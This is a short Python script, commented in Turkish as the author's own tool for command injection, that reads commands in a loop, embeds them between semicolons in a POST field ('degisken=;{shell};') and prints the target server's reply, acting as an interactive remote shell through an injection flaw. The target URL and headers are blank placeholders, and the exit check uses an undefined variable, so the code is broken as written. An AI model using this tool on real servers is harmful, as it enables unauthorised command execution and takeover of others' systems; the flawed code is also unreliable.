import requests

url = #url

headers = {
    #headers
}

print("Command Injection için Web Proxyleriyle uğraşmamak için kendime yazdığım bir script")

while True:
    shell = input("Shell => ").strip()
    
    if command.lower() == "exit":
        print("Exiting...")
        break

    payload = f"degisken=;{shell};"

    try:
        response = requests.post(url, data=payload, headers=headers)
      
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        print(response.text)
        print("-----------------------\n")
    except requests.RequestException as e:
        print(f"Error occurred: {e}")
